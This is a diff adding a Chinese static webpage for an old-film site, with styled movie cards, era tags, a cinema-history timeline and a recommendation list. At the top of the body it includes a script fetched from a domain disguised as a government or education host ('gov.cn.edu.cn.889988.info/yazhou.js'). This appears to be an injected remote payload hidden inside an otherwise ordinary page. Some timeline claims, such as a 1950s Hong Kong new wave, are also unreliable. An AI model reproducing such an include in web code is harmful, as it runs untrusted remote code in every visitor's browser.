@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>老电影网 - 经典老片怀旧影院</title>
+<meta name="description" content="老电影网（laodianyingwang-app）收录国内外经典老电影、黑白片、怀旧影视资源，重温黄金时代的银幕记忆。">
+<meta name="keywords" content="老电影网,经典老电影,怀旧电影,黑白电影,老片推荐">
+<link rel="canonical" href="https://laodianyingwang-app.github.io/">
+<style>
+/* ===== 全局重置 ===== */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: "Noto Serif SC", "SimSun", serif;
+    background: #0a0a0a;
+    color: #d4c9a8;
+    line-height: 1.8;
+    overflow-x: hidden;
+}
+
+/* ===== 胶片顶部装饰 ===== */
+.film-strip-top {
+    height: 18px;
+    background: repeating-linear-gradient(
+        90deg,
+        #000 0px, #000 12px,
+        #d4c9a8 12px, #d4c9a8 16px
+    );
+    opacity: 0.7;
+}
+
+/* ===== 头部 ===== */
+.header {
+    background: linear-gradient(180deg, #1a1a1a 0%, #0a0a0a 100%);
+    border-bottom: 2px solid #8b7355;
+    padding: 2rem 1rem 1.5rem;
+    text-align: center;
+    position: relative;
+}
+
+.header::before {
+    content: "🎬";
+    font-size: 2.2rem;
+    display: block;
+    margin-bottom: 0.5rem;
+}
+
+.site-title {
+    font-size: clamp(1.6rem, 5vw, 2.6rem);
+    color: #f0e6d3;
+    letter-spacing: 0.3em;
+    text-shadow: 2px 2px 4px rgba(0,0,0,0.8);
+    margin-bottom: 0.3rem;
+}
+
+.site-subtitle {
+    font-size: clamp(0.8rem, 2.5vw, 1rem);
+    color: #8b7355;
+    font-style: italic;
+}
+
+/* ===== 导航 ===== */
+.nav {
+    background: #111;
+    border-bottom: 1px solid #333;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+}
+
+.nav-inner {
+    max-width: 1100px;
+    margin: 0 auto;
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 0;
+}
+
+.nav a {
+    color: #b8a88e;
+    text-decoration: none;
+    padding: 0.85rem 1.2rem;
+    font-size: 0.9rem;
+    border-bottom: 3px solid transparent;
+    transition: all 0.3s;
+}
+
+.nav a:hover {
+    color: #f0e6d3;
+    border-bottom-color: #8b7355;
+    background: #1a1a1a;
+}
+
+/* ===== 主容器 ===== */
+.container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 2rem 1rem;
+}
+
+/* ===== 栏目通用 ===== */
+.section {
+    margin-bottom: 3rem;
+    padding: 2rem;
+    background: linear-gradient(135deg, #111 0%, #1a1a1a 100%);
+    border: 1px solid #2a2a2a;
+    border-left: 4px solid #8b7355;
+    border-radius: 4px;
+    position: relative;
+}
+
+.section::before {
+    content: attr(data-num);
+    position: absolute;
+    top: -12px;
+    left: 20px;
+    background: #8b7355;
+    color: #000;
+    font-size: 0.75rem;
+    padding: 2px 10px;
+    border-radius: 10px;
+    font-weight: bold;
+}
+
+.section h2 {
+    font-size: clamp(1.2rem, 3.5vw, 1.6rem);
+    color: #f0e6d3;
+    margin-bottom: 1rem;
+    padding-bottom: 0.5rem;
+    border-bottom: 1px dashed #333;
+}
+
+.section h3 {
+    color: #c9b896;
+    margin: 1rem 0 0.5rem;
+    font-size: 1rem;
+}
+
+.section p {
+    margin-bottom: 0.8rem;
+    color: #a89e8a;
+    text-align: justify;
+}
+
+/* ===== 电影卡片网格 ===== */
+.movie-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+    gap: 1.2rem;
+    margin-top: 1.2rem;
+}
+
+.movie-card {
+    background: #0a0a0a;
+    border: 1px solid #2a2a2a;
+    border-radius: 4px;
+    overflow: hidden;
+    transition: transform 0.3s, border-color 0.3s;
+    cursor: pointer;
+}
+
+.movie-card:hover {
+    transform: translateY(-4px);
+    border-color: #8b7355;
+}
+
+.movie-poster {
+    width: 100%;
+    height: 180px;
+    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 2.5rem;
+    border-bottom: 1px solid #2a2a2a;
+}
+
+.movie-info {
+    padding: 0.7rem;
+}
+
+.movie-title {
+    font-size: 0.85rem;
+    color: #f0e6d3;
+    margin-bottom: 0.2rem;
+}
+
+.movie-year {
+    font-size: 0.75rem;
+    color: #8b7355;
+}
+
+/* ===== 分类标签 ===== */
+.cat-tags {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.6rem;
+    margin-top: 1rem;
+}
+
+.cat-tag {
+    padding: 0.4rem 1rem;
+    background: #0a0a0a;
+    border: 1px solid #333;
+    border-radius: 20px;
+    color: #b8a88e;
+    font-size: 0.85rem;
+    transition: all 0.3s;
+    cursor: pointer;
+}
+
+.cat-tag:hover {
+    border-color: #8b7355;
+    color: #f0e6d3;
+    background: #1a1a1a;
+}
+
+/* ===== 时间线 ===== */
+.timeline {
+    position: relative;
+    padding-left: 2rem;
+    margin-top: 1rem;
+}
+
+.timeline::before {
+    content: "";
+    position: absolute;
+    left: 6px;
+    top: 0;
+    bottom: 0;
+    width: 2px;
+    background: #8b7355;
+}
+
+.timeline-item {
+    position: relative;
+    margin-bottom: 1.5rem;
+    padding-left: 1rem;
+}
+
+.timeline-item::before {
+    content: "";
+    position: absolute;
+    left: -1.65rem;
+    top: 6px;
+    width: 10px;
+    height: 10px;
+    border-radius: 50%;
+    background: #8b7355;
+    border: 2px solid #0a0a0a;
+}
+
+.timeline-year {
+    font-size: 0.85rem;
+    color: #8b7355;
+    font-weight: bold;
+}
+
+.timeline-text {
+    font-size: 0.9rem;
+    color: #a89e8a;
+}
+
+/* ===== 推荐列表 ===== */
+.rec-list {
+    list-style: none;
+    margin-top: 1rem;
+}
+
+.rec-list li {
+    padding: 0.7rem 0;
+    border-bottom: 1px dotted #2a2a2a;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+}
+
+.rec-list li:last-child {
+    border-bottom: none;
+}
+
+.rec-name {
+    color: #d4c9a8;
+    font-size: 0.95rem;
+}
+
+.rec-rating {
+    color: #8b7355;
+    font-size: 0.85rem;
+}
+
+/* ===== 底部 ===== */
+.footer {
+    background: #050505;
+    border-top: 2px solid #8b7355;
+    padding: 2rem 1rem 1rem;
+    text-align: center;
+}
+
+.footer p {
+    color: #555;
+    font-size: 0.8rem;
+    margin-bottom: 0.5rem;
+}
+
+.footer a {
+    color: #8b7355;
+    text-decoration: none;
+}
+
+/* ===== 响应式 ===== */
+@media (max-width: 768px) {
+    .nav-inner {
+        flex-direction: column;
+        align-items: stretch;
+    }
+    .nav a {
+        text-align: center;
+        border-bottom: 1px solid #222;
+    }
+    .section {
+        padding: 1.5rem 1rem;
+    }
+    .movie-grid {
+        grid-template-columns: repeat(auto-fill, minmax(110px, 1fr));
+        gap: 0.8rem;
+    }
+    .movie-poster {
+        height: 140px;
+        font-size: 2rem;
+    }
+}
+
+@media (max-width: 480px) {
+    .site-title {
+        letter-spacing: 0.15em;
+    }
+    .section h2 {
+        font-size: 1.1rem;
+    }
+    .timeline {
+        padding-left: 1.2rem;
+    }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<!-- 胶片装饰条 -->
+<div class="film-strip-top"></div>
+
+<!-- 头部 -->
+<header class="header">
+    <h1 class="site-title">老电影网</h1>
+    <p class="site-subtitle">laodianyingwang-app.github.io · 重温银幕黄金时代</p>
+</header>
+
+<!-- 导航 -->
+<nav class="nav">
+    <div class="nav-inner">
+        <a href="#">首页</a>
+        <a href="#">经典片库</a>
+        <a href="#">年代分类</a>
+        <a href="#">影史回顾</a>
+        <a href="#">推荐榜单</a>
+        <a href="#">关于本站</a>
+    </div>
+</nav>
+
+<!-- 主内容 -->
+<main class="container">
+
+    <!-- 栏目一：经典片库 -->
+    <section class="section" data-num="01" id="library">
+        <h2>📽 经典片库</h2>
+        <p>老电影网精心收录 1920–2000 年间中外经典老电影，涵盖黑白片、彩色片、默片、戏曲片等丰富类型，为您打造一座线上怀旧影院。</p>
+        <div class="movie-grid">
+            <div class="movie-card">
+                <div class="movie-poster">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">罗马假日</div>
+                    <div class="movie-year">1953 · 美国</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster" style="background:linear-gradient(135deg,#2e1a0a,#5a3a1a);">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">乱世佳人</div>
+                    <div class="movie-year">1939 · 美国</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster" style="background:linear-gradient(135deg,#0a1a2e,#1a3a5a);">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">魂断蓝桥</div>
+                    <div class="movie-year">1940 · 美国</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster" style="background:linear-gradient(135deg,#1a0a1a,#3a1a3a);">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">霸王别姬</div>
+                    <div class="movie-year">1993 · 中国</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster" style="background:linear-gradient(135deg,#0a2e1a,#1a5a3a);">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">活着</div>
+                    <div class="movie-year">1994 · 中国</div>
+                </div>
+            </div>
+            <div class="movie-card">
+                <div class="movie-poster" style="background:linear-gradient(135deg,#2e2e0a,#5a5a1a);">🎞</div>
+                <div class="movie-info">
+                    <div class="movie-title">天堂电影院</div>
+                    <div class="movie-year">1988 · 意大利</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目二：年代分类 -->
+    <section class="section" data-num="02" id="era">
+        <h2>🗂 年代分类</h2>
+        <p>按年代快速定位您想看的怀旧影片，老电影网为您梳理每个时代的银幕经典。</p>
+        <h3>热门年代</h3>
+        <div class="cat-tags">
+            <span class="cat-tag">1920年代默片</span>
+            <span class="cat-tag">1930年代黑白</span>
+            <span class="cat-tag">1940年代黄金</span>
+            <span class="cat-tag">1950年代彩色</span>
+            <span class="cat-tag">1960年代经典</span>
+            <span class="cat-tag">1970年代港片</span>
+            <span class="cat-tag">1980年代合拍</span>
+            <span class="cat-tag">1990年代巅峰</span>
+        </div>
+        <h3>类型标签</h3>
+        <div class="cat-tags">
+            <span class="cat-tag">爱情</span>
+            <span class="cat-tag">战争</span>
+            <span class="cat-tag">喜剧</span>
+            <span class="cat-tag">悬疑</span>
+            <span class="cat-tag">戏曲</span>
+            <span class="cat-tag">动画</span>
+            <span class="cat-tag">纪录片</span>
+        </div>
+    </section>
+
+    <!-- 栏目三：影史回顾 -->
+    <section class="section" data-num="03" id="history">
+        <h2>📜 影史回顾</h2>
+        <p>跟随老电影网的脚步，回顾世界电影史上的重要里程碑。</p>
+        <div class="timeline">
+            <div class="timeline-item">
+                <div class="timeline-year">1895年</div>
+                <div class="timeline-text">卢米埃尔兄弟首次公开放映电影，电影时代正式开启。</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">1927年</div>
+                <div class="timeline-text">《爵士歌王》上映，有声电影时代来临。</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">1939年</div>
+                <div class="timeline-text">《乱世佳人》首映，好莱坞黄金时代代表作。</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">1950年代</div>
+                <div class="timeline-text">香港电影新浪潮兴起，粤语片、黄梅调风靡。</div>
+            </div>
+            <div class="timeline-item">
+                <div class="timeline-year">1990年代</div>
+                <div class="timeline-text">华语电影走向国际，众多经典作品斩获国际大奖。</div>
+            </div>
+        </div>
+    </section>
+
+    <!-- 栏目四：推荐榜单 -->
+    <section class="section" data-num="04" id="ranking">
+        <h2>🏆 推荐榜单</h2>
+        <p>老电影网编辑部精选高分老片，带您发现被时光沉淀的佳作。</p>
+        <ul class="rec-list">
+            <li>
+                <span class="rec-name">《肖申克的救赎》</span>
+                <span class="rec-rating">⭐ 9.7 · 1994</span>
+            </li>
+            <li>
+                <span class="rec-name">《阿甘正传》</span>
+                <span class="rec-rating">⭐ 9.5 · 1994</span>
+            </li>
+            <li>
+                <span class="rec-name">《这个杀手不太冷》</span>
+                <span class="rec-rating">⭐ 9.4 · 1994</span>
+            </li>
+            <li>
+                <span class="rec-name">《泰坦尼克号》</span>
+                <span class="rec-rating">⭐ 9.4 · 1997</span>
+            </li>
+            <li>
+                <span class="rec-name">《美丽人生》</span>
+                <span class="rec-rating">⭐ 9.5 · 1997</span>
+            </li>
+            <li>
+                <span class="rec-name">《千与千寻》</span>
+                <span class="rec-rating">⭐ 9.4 · 2001</span>
+            </li>
+        </ul>
+    </section>
+
+    <!-- 栏目五：观影指南 -->
+    <section class="section" data-num="05" id="guide">
+        <h2>🎫 观影指南</h2>
+        <p>老电影网为您提供老片观影入门建议，帮助新观众快速融入经典世界。</p>
+        <h3>新手入门三部曲</h3>
+        <p>1. 从获奖作品入手，如奥斯卡最佳影片、戛纳金棕榈奖作品。</p>
+        <p>2. 关注影史公认的导演系列，如黑泽明、希区柯克、王家卫。</p>
+        <p>3. 按年代顺序观看，感受电影技术与叙事的演变。</p>
+        <h3>老片修复资源</h3>
+        <p>本站持续关注全球4K修复版老电影动态，为您提供最新修复资讯。</p>
+    </section>
+
+    <!-- 栏目六：关于本站 -->
+    <section class="section" data-num="06" id="about">
+        <h2>ℹ 关于老电影网</h2>
+        <p><strong>老电影网</strong>（laodianyingwang-app）是一个专注于经典老电影分享与推荐的公益性质网站，致力于让更多人发现和欣赏银幕上的永恒经典。</p>
+        <p>网站名称：老电影网<br>
+        网站网址：https://laodianyingwang-app.github.io<br>
+        关键词：老电影网、经典老电影、怀旧影视</p>
+        <p>本站所有内容仅供交流学习，资源版权归原作者及出品方所有。</p>
+    </section>
+
+</main>
+
+<!-- 底部 -->
+<footer class="footer">
+    <p>© 2024 老电影网（laodianyingwang-app）· 经典永流传</p>
+    <p>网站名称：<strong>老电影网</strong> | 网址：<a href="https://laodianyingwang-app.github.io">laodianyingwang-app.github.io</a></p>
+    <p>本页面为单页静态网站，符合必应搜索引擎收录规范</p>
+</footer>
+
+</body>
+</html>
